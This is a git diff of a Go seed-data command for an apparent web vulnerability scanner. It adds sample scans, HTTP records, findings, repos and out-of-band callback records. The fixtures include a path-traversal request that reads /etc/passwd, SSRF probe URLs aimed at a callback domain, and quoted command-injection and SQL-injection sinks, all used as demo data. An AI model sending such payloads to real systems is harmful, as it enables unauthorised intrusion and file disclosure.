@@ -95,6 +95,7 @@ func runDBSeed(cmd *cobra.Command, args []string) error {
 
 	// --- Findings (check by finding_hash to avoid duplicates on re-seed) ---
 	findings := seedFindings(rng, records)
+	enrichFindings(findings, records)
 	findingsInserted := 0
 	for _, f := range findings {
 		f.ProjectUUID = projectUUID
@@ -167,9 +168,29 @@ func runDBSeed(cmd *cobra.Command, args []string) error {
 
 	// --- OAST Interactions (check by unique_id to avoid duplicates) ---
 	interactions := seedOASTInteractions(scans)
+	// Link specific OAST rows to their originating finding via ModuleID heuristic.
+	// Findings have their IDs populated by the finding_records loop above.
+	moduleIDToFinding := make(map[string]int64, len(findings))
+	for _, f := range findings {
+		if f.ID > 0 {
+			// first-wins preserves the earliest finding for each module ID
+			if _, ok := moduleIDToFinding[f.ModuleID]; !ok {
+				moduleIDToFinding[f.ModuleID] = f.ID
+			}
+		}
+	}
+	oastToFinding := map[string]string{
+		"seed-oast-http-002": "ssti-expression-eval", // SSTI blind callback → SSTI finding
+		"seed-oast-dns-002":  "xxe-generic",          // XXE DNS callback → XXE finding (none seeded, will be 0)
+	}
 	oastInserted := 0
 	for _, oi := range interactions {
 		oi.ProjectUUID = projectUUID
+		if mod, ok := oastToFinding[oi.UniqueID]; ok {
+			if fid, ok := moduleIDToFinding[mod]; ok {
+				oi.FindingID = fid
+			}
+		}
 		exists, _ := db.NewSelect().Model((*database.OASTInteraction)(nil)).Where("unique_id = ?", oi.UniqueID).Exists(ctx)
 		if exists {
 			continue
@@ -237,62 +258,96 @@ func seedScans(rng *rand.Rand) []*database.Scan {
 	now := time.Now()
 	return []*database.Scan{
 		{
-			UUID:          "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
-			Name:          "Full scan — example.com",
-			Description:   "Complete scan of example.com with all modules enabled",
-			Status:        "completed",
-			Target:        "https://example.com",
-			Modules:       "xss,sqli,lfi,ssti,crlf,openredirect",
-			Threads:       10,
-			StartedAt:     now.Add(-2 * time.Hour),
-			FinishedAt:    now.Add(-1*time.Hour - 45*time.Minute),
-			DurationMs:    900000,
-			TotalRequests: 85,
-			TotalFindings: 15,
-			CriticalCount: 1,
-			HighCount:     2,
-			MediumCount:   2,
-			LowCount:      1,
-			InfoCount:     1,
-			SuspectCount:  8,
-			CreatedAt:     now.Add(-2 * time.Hour),
-			UpdatedAt:     now.Add(-1*time.Hour - 45*time.Minute),
+			UUID:            "scan-0001-aaaa-bbbb-cccc-ddddeeee0001",
+			Name:            "Full scan — example.com",
+			Description:     "Complete scan of example.com with all modules enabled",
+			Status:          "completed",
+			Target:          "https://example.com",
+			Modules:         "xss,sqli,lfi,ssti,crlf,openredirect",
+			Threads:         10,
+			Profile:         "full",
+			Tags:            []string{"full-scan", "release-blocker"},
+			TriggeredBy:     "user",
+			SourcePath:      "/opt/repos/example-frontend",
+			SourceType:      database.SourceTypeLocal,
+			AgenticScanUUID: "agent-0002-aaaa-bbbb-cccc-ddddeeee0002",
+			ScanSource:      "cli",
+			ScanMode:        "full",
+			StartCursorAt:   now.Add(-2 * time.Hour),
+			CursorAt:        now.Add(-1*time.Hour - 45*time.Minute),
+			ProcessedCount:  85,
+			StartedAt:       now.Add(-2 * time.Hour),
+			FinishedAt:      now.Add(-1*time.Hour - 45*time.Minute),
+			DurationMs:      900000,
+			TotalRequests:   85,
+			TotalFindings:   15,
+			CriticalCount:   1,
+			HighCount:       2,
+			MediumCount:     2,
+			LowCount:        1,
+			InfoCount:       1,
+			SuspectCount:    8,
+			StorageURL:      "gs://vigolium-scans/proj-default/scan-0001.tar.gz",
+			CreatedAt:       now.Add(-2 * time.Hour),
+			UpdatedAt:       now.Add(-1*time.Hour - 45*time.Minute),
 		},
 		{
-			UUID:          "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
-			Name:          "API scan — api.shop.local",
-			Description:   "REST API scan targeting JSON endpoints",
-			Status:        "completed",
-			Target:        "https://api.shop.local",
-			Modules:       "sqli,ssti,crlf",
-			Threads:       5,
-			StartedAt:     now.Add(-5 * time.Hour),
-			FinishedAt:    now.Add(-4*time.Hour - 30*time.Minute),
-			DurationMs:    1800000,
-			TotalRequests: 120,
-			TotalFindings: 9,
-			HighCount:     1,
-			MediumCount:   2,
-			InfoCount:     1,
-			SuspectCount:  5,
-			CreatedAt:     now.Add(-5 * time.Hour),
-			UpdatedAt:     now.Add(-4*time.Hour - 30*time.Minute),
+			UUID:            "scan-0002-aaaa-bbbb-cccc-ddddeeee0002",
+			Name:            "API scan — api.shop.local",
+			Description:     "REST API scan targeting JSON endpoints",
+			Status:          "completed",
+			Target:          "https://api.shop.local",
+			Modules:         "sqli,ssti,crlf",
+			Threads:         5,
+			Profile:         "api",
+			Tags:            []string{"api-scan", "openapi-driven"},
+			TriggeredBy:     "schedule",
+			SourcePath:      "https://github.com/vigolium/shop-api",
+			SourceType:      database.SourceTypeGitURL,
+			AgenticScanUUID: "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
+			ScanSource:      "api",
+			ScanMode:        "incremental",
+			StartCursorAt:   now.Add(-6 * time.Hour),
+			StartCursorUUID: "rec-0001-seed-aaaa-bbbb-cccc0001",
+			CursorAt:        now.Add(-4*time.Hour - 30*time.Minute),
+			CursorUUID:      "rec-0030-seed-aaaa-bbbb-cccc001e",
+			ProcessedCount:  120,
+			StartedAt:       now.Add(-5 * time.Hour),
+			FinishedAt:      now.Add(-4*time.Hour - 30*time.Minute),
+			DurationMs:      1800000,
+			TotalRequests:   120,
+			TotalFindings:   9,
+			HighCount:       1,
+			MediumCount:     2,
+			InfoCount:       1,
+			SuspectCount:    5,
+			StorageURL:      "gs://vigolium-scans/proj-default/scan-0002.tar.gz",
+			CreatedAt:       now.Add(-5 * time.Hour),
+			UpdatedAt:       now.Add(-4*time.Hour - 30*time.Minute),
 		},
 		{
-			UUID:          "scan-0003-aaaa-bbbb-cccc-ddddeeee0003",
-			Name:          "Quick XSS check — blog.test",
-			Description:   "XSS-only quick scan",
-			Status:        "running",
-			Target:        "https://blog.test",
-			Modules:       "xss",
-			Threads:       3,
-			StartedAt:     now.Add(-10 * time.Minute),
-			TotalRequests: 30,
-			TotalFindings: 2,
-			MediumCount:   1,
-			SuspectCount:  1,
-			CreatedAt:     now.Add(-10 * time.Minute),
-			UpdatedAt:     now.Add(-2 * time.Minute),
+			UUID:           "scan-0003-aaaa-bbbb-cccc-ddddeeee0003",
+			Name:           "Quick XSS check — blog.test",
+			Description:    "XSS-only quick scan",
+			Status:         "running",
+			Target:         "https://blog.test",
+			Modules:        "xss",
+			Threads:        3,
+			Profile:        "light",
+			Tags:           []string{"xss-only", "quick"},
+			TriggeredBy:    "user",
+			ScanSource:     "cli",
+			ScanMode:       "full",
+			StartCursorAt:  now.Add(-10 * time.Minute),
+			CursorAt:       now.Add(-2 * time.Minute),
+			ProcessedCount: 18,
+			StartedAt:      now.Add(-10 * time.Minute),
+			TotalRequests:  30,
+			TotalFindings:  2,
+			MediumCount:    1,
+			SuspectCount:   1,
+			CreatedAt:      now.Add(-10 * time.Minute),
+			UpdatedAt:      now.Add(-2 * time.Minute),
 		},
 		{
 			UUID:         "scan-0004-aaaa-bbbb-cccc-ddddeeee0004",
@@ -302,12 +357,43 @@ func seedScans(rng *rand.Rand) []*database.Scan {
 			Target:       "https://unreachable.internal",
 			Modules:      "xss,sqli",
 			Threads:      5,
+			Profile:      "light",
+			Tags:         []string{"failed"},
+			TriggeredBy:  "user",
+			ScanSource:   "cli",
+			ScanMode:     "full",
 			StartedAt:    now.Add(-24 * time.Hour),
 			FinishedAt:   now.Add(-24*time.Hour + 30*time.Second),
 			DurationMs:   30000,
 			ErrorMessage: "connection timeout after 30s: dial tcp: lookup unreachable.internal: no such host",
 			CreatedAt:    now.Add(-24 * time.Hour),
 			UpdatedAt:    now.Add(-24*time.Hour + 30*time.Second),
+		},
+		{
+			UUID:           "scan-0005-aaaa-bbbb-cccc-ddddeeee0005",
+			Name:           "Scan-on-receive — proxied POST /login",
+			Description:    "Auto-scan triggered by ingestion of a POST /login record from the proxy",
+			Status:         "completed",
+			Target:         "https://example.com/login",
+			Modules:        "sqli,xss,sessionfixation",
+			Threads:        3,
+			Profile:        "light",
+			Tags:           []string{"scan-on-receive", "proxy-triggered"},
+			TriggeredBy:    "webhook",
+			HTTPRecordUUID: "rec-0005-seed-aaaa-bbbb-cccc0005",
+			ScanSource:     "scan-on-receive",
+			ScanMode:       "incremental",
+			StartCursorAt:  now.Add(-20 * time.Minute),
+			CursorAt:       now.Add(-18 * time.Minute),
+			ProcessedCount: 1,
+			StartedAt:      now.Add(-20 * time.Minute),
+			FinishedAt:     now.Add(-18 * time.Minute),
+			DurationMs:     120000,
+			TotalRequests:  12,
+			TotalFindings:  1,
+			MediumCount:    1,
+			CreatedAt:      now.Add(-20 * time.Minute),
+			UpdatedAt:      now.Add(-18 * time.Minute),
 		},
 	}
 }
@@ -352,9 +438,11 @@ type seedEndpoint struct {
 	reqHeaders  map[string][]string
 	respHeaders map[string][]string
 	remarks     []string
+	technology  []string
+	parentPath  string // path of parent record on same host (empty = no parent)
 }
 
-func seedHTTPRecords(_ *rand.Rand, _ []*database.Scan) []*database.HTTPRecord {
+func seedHTTPRecords(_ *rand.Rand, scans []*database.Scan) []*database.HTTPRecord {
 	now := time.Now()
 
 	endpoints := []seedEndpoint{
@@ -362,6 +450,7 @@ func seedHTTPRecords(_ *rand.Rand, _ []*database.Scan) []*database.HTTPRecord {
 		{method: "GET", path: "/", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 14520, timeMs: 120, title: "Example Domain — Home",
 			reqHeaders:  map[string][]string{"Host": {"example.com"}, "Accept": {"text/html,application/xhtml+xml"}, "User-Agent": {"Mozilla/5.0"}},
 			respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}, "Server": {"nginx/1.24"}, "X-Frame-Options": {"SAMEORIGIN"}},
+			technology:  []string{"nginx/1.24", "next.js"},
 		},
 		{method: "GET", path: "/about", host: 0, scan: 0, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 8732, timeMs: 95, title: "About Us — Example",
 			reqHeaders: map[string][]string{"Host": {"example.com"}, "Accept": {"text/html"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}, "Cache-Control": {"max-age=3600"}},
@@ -421,6 +510,7 @@ func seedHTTPRecords(_ *rand.Rand, _ []*database.Scan) []*database.HTTPRecord {
 		{method: "GET", path: "/api/v1/products", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 34500, timeMs: 85, title: "",
 			reqAuth:    "Bearer shop-api-token-abc123",
 			reqHeaders: map[string][]string{"Host": {"api.shop.local"}, "Accept": {"application/json"}, "Authorization": {"Bearer shop-api-token-abc123"}}, respHeaders: map[string][]string{"Content-Type": {"application/json"}, "X-RateLimit-Remaining": {"98"}},
+			technology: []string{"fastapi", "python/3.11", "uvicorn"},
 		},
 		{method: "GET", path: "/api/v1/products/42", host: 1, scan: 1, status: 200, phrase: "OK", contentType: "application/json", bodyLen: 1250, timeMs: 35, title: "",
 			reqAuth:    "Bearer shop-api-token-abc123",
@@ -491,12 +581,15 @@ func seedHTTPRecords(_ *rand.Rand, _ []*database.Scan) []*database.HTTPRecord {
 		// ---- blog.test (scan 2) ----
 		{method: "GET", path: "/", host: 2, scan: 2, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 18200, timeMs: 200, title: "Blog — Latest Posts",
 			reqHeaders: map[string][]string{"Host": {"blog.test"}, "Accept": {"text/html"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}, "Server": {"Apache/2.4"}},
+			technology: []string{"apache/2.4", "ruby-on-rails"},
 		},
 		{method: "GET", path: "/post/hello-world", host: 2, scan: 2, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 12400, timeMs: 175, title: "Hello World — Blog",
 			reqHeaders: map[string][]string{"Host": {"blog.test"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
+			parentPath: "/",
 		},
 		{method: "GET", path: "/post/sql-injection-101", host: 2, scan: 2, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 15800, timeMs: 190, title: "SQL Injection 101 — Blog",
 			reqHeaders: map[string][]string{"Host": {"blog.test"}}, respHeaders: map[string][]string{"Content-Type": {"text/html; charset=UTF-8"}},
+			parentPath: "/",
 		},
 		{method: "POST", path: "/post/hello-world/comment", host: 2, scan: 2, status: 201, phrase: "Created", contentType: "text/html", bodyLen: 350, timeMs: 220, title: "",
 			reqCT: "application/x-www-form-urlencoded", reqBody: []byte("author=Alice&body=Great+post!&email=alice@test.com"),
@@ -518,6 +611,7 @@ func seedHTTPRecords(_ *rand.Rand, _ []*database.Scan) []*database.HTTPRecord {
 		// ---- legacy.example.com (no scan — ingested traffic) ----
 		{method: "GET", path: "/", host: 3, scan: -1, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 3500, timeMs: 350, title: "Legacy Portal",
 			reqHeaders: map[string][]string{"Host": {"legacy.example.com"}, "Accept": {"text/html"}}, respHeaders: map[string][]string{"Content-Type": {"text/html"}, "Server": {"Apache/2.2"}, "X-Powered-By": {"PHP/5.6"}},
+			technology: []string{"apache/2.2", "php/5.6"},
 		},
 		{method: "GET", path: "/index.php?page=../../../etc/passwd", host: 3, scan: -1, status: 200, phrase: "OK", contentType: "text/html", bodyLen: 1800, timeMs: 280, title: "Legacy Portal",
 			params:     []database.EmbeddedParam{{Name: "page", Value: "../../../etc/passwd", Type: "url"}},
@@ -638,8 +732,24 @@ func seedHTTPRecords(_ *rand.Rand, _ []*database.Scan) []*database.HTTPRecord {
 		respBody := generateSeedBody(ep, h)
 		rawResp := buildRawResponse(ep.status, ep.phrase, ep.respHeaders, ep.contentType, respBody)
 
+		scanUUID := ""
+		if ep.scan >= 0 && ep.scan < len(scans) {
+			scanUUID = scans[ep.scan].UUID
+		}
+
+		parentUUID := ""
+		if ep.parentPath != "" {
+			for _, prev := range records {
+				if prev.Hostname == h.hostname && prev.Path == ep.parentPath {
+					parentUUID = prev.UUID
+					break
+				}
+			}
+		}
+
 		rec := &database.HTTPRecord{
 			UUID:     uuid,
+			ScanUUID: scanUUID,
 			Scheme:   h.scheme,
 			Hostname: h.hostname,
 			Port:     h.port,
@@ -677,8 +787,13 @@ func seedHTTPRecords(_ *rand.Rand, _ []*database.Scan) []*database.HTTPRecord {
 			ReceivedAt: sentAt.Add(time.Duration(ep.timeMs) * time.Millisecond),
 			CreatedAt:  sentAt,
 
-			Source:  "seed",
-			Remarks: ep.remarks,
+			Source:          "seed",
+			Remarks:         ep.remarks,
+			Technology:      ep.technology,
+			ContentHash:     hashStr(respBody),
+			IsAuthenticated: ep.reqAuth != "" || hasAuthHeader(ep.reqHeaders),
+			ParentUUID:      parentUUID,
+			RiskScore:       computeRiskScore(ep.remarks, ep.status),
 		}
 		records = append(records, rec)
 	}
@@ -1301,7 +1416,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "critical",
 			Confidence:       "firm",
 			Tags:             []string{"sast", "sqli", "python", "fastapi", "cwe-89"},
-			Status:           "confirmed",
+			Status:           "triaged",
 			Remediation:      "Replace f-string SQL with parameterized query: db.execute(\"SELECT * FROM products WHERE name LIKE ?\", [f\"%{search}%\"])",
 			CWEID:            "CWE-89",
 			CVSSScore:        9.8,
@@ -1331,7 +1446,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "critical",
 			Confidence:       "certain",
 			Tags:             []string{"sast", "command-injection", "php", "cwe-78"},
-			Status:           "open",
+			Status:           "triaged",
 			Remediation:      "Replace system() with escapeshellarg(): system('echo ' . escapeshellarg($name) . ' >> /var/log/submissions')",
 			CWEID:            "CWE-78",
 			CVSSScore:        10.0,
@@ -1360,7 +1475,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "critical",
 			Confidence:       "certain",
 			Tags:             []string{"sast", "lfi", "path-traversal", "php", "cwe-98"},
-			Status:           "confirmed",
+			Status:           "triaged",
 			Remediation:      "Use a whitelist of allowed pages: $allowed = ['home','about','contact']; if(in_array($page, $allowed)) include($page.'.php');",
 			CWEID:            "CWE-98",
 			CVSSScore:        9.1,
@@ -1386,7 +1501,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "high",
 			Confidence:       "firm",
 			Tags:             []string{"sast", "xss", "react", "nextjs", "cwe-79"},
-			Status:           "open",
+			Status:           "triaged",
 			Remediation:      "Sanitize input with DOMPurify before rendering: dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(query)}}",
 			CWEID:            "CWE-79",
 			CVSSScore:        6.1,
@@ -1415,7 +1530,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "high",
 			Confidence:       "certain",
 			Tags:             []string{"sast", "secret", "jwt", "go", "cwe-798"},
-			Status:           "open",
+			Status:           "triaged",
 			Remediation:      "Move JWT secret to environment variable: signingKey := os.Getenv(\"JWT_SECRET\")",
 			CWEID:            "CWE-798",
 			CVSSScore:        7.5,
@@ -1447,7 +1562,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "high",
 			Confidence:       "certain",
 			Tags:             []string{"agent", "idor", "access-control", "owasp-a1", "cwe-639"},
-			Status:           "confirmed",
+			Status:           "triaged",
 			Remediation:      "Implement authorization check: verify the authenticated user's ID matches the requested resource ID, or restrict to admin role",
 			CWEID:            "CWE-639",
 			CVSSScore:        7.5,
@@ -1479,7 +1594,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "critical",
 			Confidence:       "certain",
 			Tags:             []string{"agent", "mass-assignment", "privilege-escalation", "cwe-915"},
-			Status:           "open",
+			Status:           "triaged",
 			Remediation:      "Add an allowlist of updatable fields in the PATCH handler. Exclude 'role', 'is_admin', and other privilege fields from user-modifiable attributes",
 			CWEID:            "CWE-915",
 			CVSSScore:        9.1,
@@ -1511,7 +1626,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "critical",
 			Confidence:       "certain",
 			Tags:             []string{"agent", "auth-bypass", "sqli", "cwe-287"},
-			Status:           "confirmed",
+			Status:           "triaged",
 			Remediation:      "Use parameterized queries in the login handler and implement rate limiting. Replace: f\"SELECT * FROM users WHERE username='{username}'\" with db.execute(\"SELECT * FROM users WHERE username = ?\", [username])",
 			CWEID:            "CWE-287",
 			CVSSScore:        9.8,
@@ -1544,7 +1659,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "critical",
 			Confidence:       "certain",
 			Tags:             []string{"agent", "ssrf", "cloud-metadata", "cwe-918"},
-			Status:           "open",
+			Status:           "triaged",
 			Remediation:      "Implement URL allowlist for import sources. Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x) and cloud metadata endpoints",
 			CWEID:            "CWE-918",
 			CVSSScore:        9.1,
@@ -1578,7 +1693,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "critical",
 			Confidence:       "certain",
 			Tags:             []string{"extension", "jwt", "auth-bypass", "cwe-347"},
-			Status:           "open",
+			Status:           "triaged",
 			Remediation:      "Explicitly reject 'none' algorithm in JWT verification. Set allowedAlgorithms: ['HS256', 'RS256'] in the JWT library configuration",
 			CWEID:            "CWE-347",
 			CVSSScore:        9.1,
@@ -1611,7 +1726,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "high",
 			Confidence:       "certain",
 			Tags:             []string{"oast", "xxe", "xml", "blind", "oob", "cwe-611"},
-			Status:           "open",
+			Status:           "triaged",
 			Remediation:      "Disable external entity processing in the XML parser. For Java: factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)",
 			CWEID:            "CWE-611",
 			CVSSScore:        7.5,
@@ -1641,7 +1756,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "high",
 			Confidence:       "certain",
 			Tags:             []string{"oast", "ssrf", "blind", "webhook", "cwe-918"},
-			Status:           "confirmed",
+			Status:           "triaged",
 			Remediation:      "Validate webhook URLs against an allowlist of trusted domains. Block requests to private IP ranges and metadata endpoints",
 			CWEID:            "CWE-918",
 			CVSSScore:        7.5,
@@ -1674,7 +1789,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "high",
 			Confidence:       "certain",
 			Tags:             []string{"known-issue", "nuclei", "exposure", "config", "cwe-200"},
-			Status:           "open",
+			Status:           "triaged",
 			Remediation:      "Block access to .env files in web server configuration. Add 'location ~ /\\.env { deny all; }' to nginx config or equivalent",
 			CWEID:            "CWE-200",
 			CVSSScore:        7.5,
@@ -1788,7 +1903,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "high",
 			Confidence:       "firm",
 			Tags:             []string{"agent", "code-audit", "sqli", "ruby", "rails", "cwe-89"},
-			Status:           "open",
+			Status:           "triaged",
 			Remediation:      "Replace Comment.where(\"author = '#{params[:author]}'\") with Comment.where(author: params[:author]) to use parameterized query",
 			CWEID:            "CWE-89",
 			CVSSScore:        8.6,
@@ -1818,7 +1933,7 @@ func seedFindings(rng *rand.Rand, records []*database.HTTPRecord) []*database.Fi
 			Severity:         "medium",
 			Confidence:       "firm",
 			Tags:             []string{"agent", "code-audit", "race-condition", "toctou", "python", "cwe-367"},
-			Status:           "open",
+			Status:           "triaged",
 			Remediation:      "Use SELECT ... FOR UPDATE or database-level advisory lock to make the balance check and deduction atomic within a single transaction",
 			CWEID:            "CWE-367",
 			CVSSScore:        5.9,
@@ -1915,13 +2030,16 @@ func seedSourceRepos(scans []*database.Scan) []*database.SourceRepo {
 	now := time.Now()
 	return []*database.SourceRepo{
 		{
-			Hostname: "example.com",
-			ScanUUID: scans[0].UUID,
-			Name:     "example-frontend",
-			RootPath: "/opt/repos/example-frontend",
-			RepoType: "git",
-			Language: "javascript",
-			Framework: "next.js",
+			Hostname:   "example.com",
+			ScanUUID:   scans[0].UUID,
+			Name:       "example-frontend",
+			RootPath:   "/opt/repos/example-frontend",
+			RepoURL:    "https://github.com/vigolium/example-frontend.git",
+			RepoType:   "git",
+			Language:   "javascript",
+			Framework:  "next.js",
+			Branch:     "main",
+			CommitHash: "a1b2c3d4e5f6",
 			Endpoints: []string{
 				"GET /",
 				"GET /about",
@@ -1943,26 +2061,30 @@ func seedSourceRepos(scans []*database.Scan) []*database.SourceRepo {
 				"pages/search.tsx:23 — dangerouslySetInnerHTML with req.query.q",
 				"lib/db.ts:45 — raw SQL query with string interpolation",
 			},
-			Tags: []string{"frontend", "ssr", "production"},
+			AuthEndpoints: []string{"POST /login", "POST /logout", "GET /oauth/callback"},
+			Tags:          []string{"frontend", "ssr", "production"},
 			Metadata: map[string]interface{}{
-				"branch":     "main",
-				"commit":     "a1b2c3d4e5f6",
-				"loc":        12500,
 				"test_coverage": "72%",
+				"bundler":       "turbopack",
 			},
+			LineCount:            12500,
 			ThirdPartyScanStatus: "completed",
 			ThirdPartyScanAt:     now.Add(-6 * time.Hour),
+			LastScannedAt:        now.Add(-2 * time.Hour),
 			CreatedAt:            now.Add(-48 * time.Hour),
 			UpdatedAt:            now.Add(-6 * time.Hour),
 		},
 		{
-			Hostname:  "api.shop.local",
-			ScanUUID:  scans[1].UUID,
-			Name:      "shop-api",
-			RootPath:  "/opt/repos/shop-api",
-			RepoType:  "git",
-			Language:  "python",
-			Framework: "fastapi",
+			Hostname:   "api.shop.local",
+			ScanUUID:   scans[1].UUID,
+			Name:       "shop-api",
+			RootPath:   "/opt/repos/shop-api",
+			RepoURL:    "https://github.com/vigolium/shop-api.git",
+			RepoType:   "git",
+			Language:   "python",
+			Framework:  "fastapi",
+			Branch:     "develop",
+			CommitHash: "f6e5d4c3b2a1",
 			Endpoints: []string{
 				"GET /api/v1/products",
 				"GET /api/v1/products/:id",
@@ -1984,26 +2106,30 @@ func seedSourceRepos(scans []*database.Scan) []*database.SourceRepo {
 				"app/routes/users.py:34 — user ID directly interpolated in query",
 				"app/routes/upload.py:15 — file path constructed from user input without sanitization",
 			},
-			Tags: []string{"api", "backend", "staging"},
+			AuthEndpoints: []string{"POST /api/v1/auth/login", "POST /api/v1/auth/register", "POST /api/v1/auth/refresh"},
+			Tags:          []string{"api", "backend", "staging"},
 			Metadata: map[string]interface{}{
-				"branch":        "develop",
-				"commit":        "f6e5d4c3b2a1",
-				"loc":           8200,
 				"python_version": "3.11",
+				"package_manager": "poetry",
 			},
+			LineCount:            8200,
 			ThirdPartyScanStatus: "completed",
 			ThirdPartyScanAt:     now.Add(-12 * time.Hour),
+			LastScannedAt:        now.Add(-4*time.Hour - 30*time.Minute),
 			CreatedAt:            now.Add(-72 * time.Hour),
 			UpdatedAt:            now.Add(-12 * time.Hour),
 		},
 		{
-			Hostname:  "blog.test",
-			ScanUUID:  scans[2].UUID,
-			Name:      "blog-engine",
-			RootPath:  "/opt/repos/blog-engine",
-			RepoType:  "git",
-			Language:  "ruby",
-			Framework: "rails",
+			Hostname:   "blog.test",
+			ScanUUID:   scans[2].UUID,
+			Name:       "blog-engine",
+			RootPath:   "/opt/repos/blog-engine",
+			RepoURL:    "git@gitlab.internal:blog/blog-engine.git",
+			RepoType:   "git",
+			Language:   "ruby",
+			Framework:  "rails",
+			Branch:     "main",
+			CommitHash: "1a2b3c4d5e6f",
 			Endpoints: []string{
 				"GET /",
 				"GET /post/:slug",
@@ -2016,14 +2142,13 @@ func seedSourceRepos(scans []*database.Scan) []*database.SourceRepo {
 			Sinks: []string{
 				"app/views/search/index.html.erb:12 — raw output: <%= params[:q] %>",
 			},
-			Tags:     []string{"blog", "ruby", "development"},
-			Metadata: map[string]interface{}{
-				"branch": "main",
-				"commit": "1a2b3c4d5e6f",
-				"loc":    4300,
-			},
+			AuthEndpoints:        []string{"POST /login", "POST /logout", "GET /sessions/new"},
+			Tags:                 []string{"blog", "ruby", "development"},
+			Metadata:             map[string]interface{}{"rails_version": "7.1"},
+			LineCount:            4300,
 			ThirdPartyScanStatus: "running",
 			ThirdPartyScanAt:     now.Add(-5 * time.Minute),
+			LastScannedAt:        now.Add(-10 * time.Minute),
 			CreatedAt:            now.Add(-96 * time.Hour),
 			UpdatedAt:            now.Add(-5 * time.Minute),
 		},
@@ -2046,23 +2171,27 @@ func seedSourceRepos(scans []*database.Scan) []*database.SourceRepo {
 				"redirect.php:3 — header('Location: ' . $_GET['url'])",
 				"cgi-bin/submit.cgi:22 — system('echo ' . $name . ' >> /var/log/submissions')",
 			},
-			Tags: []string{"legacy", "php", "eol", "high-risk"},
+			AuthEndpoints: []string{"POST /login.php"},
+			Tags:          []string{"legacy", "php", "eol", "high-risk"},
 			Metadata: map[string]interface{}{
 				"php_version": "5.6",
-				"loc":         1800,
 				"note":        "scheduled for decommission Q2 2026",
 			},
+			LineCount: 1800,
 			CreatedAt: now.Add(-168 * time.Hour),
 			UpdatedAt: now.Add(-168 * time.Hour),
 		},
 		{
-			Hostname:  "admin.example.com",
-			ScanUUID:  scans[0].UUID,
-			Name:      "admin-panel",
-			RootPath:  "/opt/repos/admin-panel",
-			RepoType:  "git",
-			Language:  "go",
-			Framework: "gin",
+			Hostname:   "admin.example.com",
+			ScanUUID:   scans[0].UUID,
+			Name:       "admin-panel",
+			RootPath:   "/opt/repos/admin-panel",
+			RepoURL:    "gs://vigolium-sources/admin-panel-snapshot.tar.gz",
+			RepoType:   "git",
+			Language:   "go",
+			Framework:  "gin",
+			Branch:     "main",
+			CommitHash: "9f8e7d6c5b4a",
 			Endpoints: []string{
 				"GET /admin/",
 				"GET /admin/settings",
@@ -2075,14 +2204,13 @@ func seedSourceRepos(scans []*database.Scan) []*database.SourceRepo {
 				"handlers/logs.go:42 — os.ReadFile(filepath.Join(logDir, r.Query(\"file\")))",
 				"handlers/settings.go:78 — template.HTML(debugValue) passed to template",
 			},
-			Tags: []string{"admin", "internal", "go"},
-			Metadata: map[string]interface{}{
-				"branch": "main",
-				"commit": "9f8e7d6c5b4a",
-				"loc":    3100,
-			},
+			AuthEndpoints:        []string{"POST /admin/login"},
+			Tags:                 []string{"admin", "internal", "go"},
+			Metadata:             map[string]interface{}{"go_version": "1.26"},
+			LineCount:            3100,
 			ThirdPartyScanStatus: "completed",
 			ThirdPartyScanAt:     now.Add(-3 * time.Hour),
+			LastScannedAt:        now.Add(-2 * time.Hour),
 			CreatedAt:            now.Add(-120 * time.Hour),
 			UpdatedAt:            now.Add(-3 * time.Hour),
 		},
@@ -2113,6 +2241,7 @@ func seedOASTInteractions(scans []*database.Scan) []*database.OASTInteraction {
 			ParameterName: "url",
 			InjectionType: "ssrf",
 			ModuleID:      "ssrf-detection",
+			Payload:       "http://seed-oast-dns-001." + oastDomain + "/",
 			CreatedAt:     now.Add(-4*time.Hour - 18*time.Minute),
 		},
 		// HTTP interaction — SSRF probe confirming out-of-band HTTP callback
@@ -2129,6 +2258,7 @@ func seedOASTInteractions(scans []*database.Scan) []*database.OASTInteraction {
 			ParameterName: "callback",
 			InjectionType: "ssrf",
 			ModuleID:      "ssrf-detection",
+			Payload:       "http://seed-oast-http-001." + oastDomain + "/",
 			CreatedAt:     now.Add(-4*time.Hour - 17*time.Minute),
 		},
 		// DNS interaction — XXE probe on example.com SOAP endpoint
@@ -2146,6 +2276,7 @@ func seedOASTInteractions(scans []*database.Scan) []*database.OASTInteraction {
 			ParameterName: "",
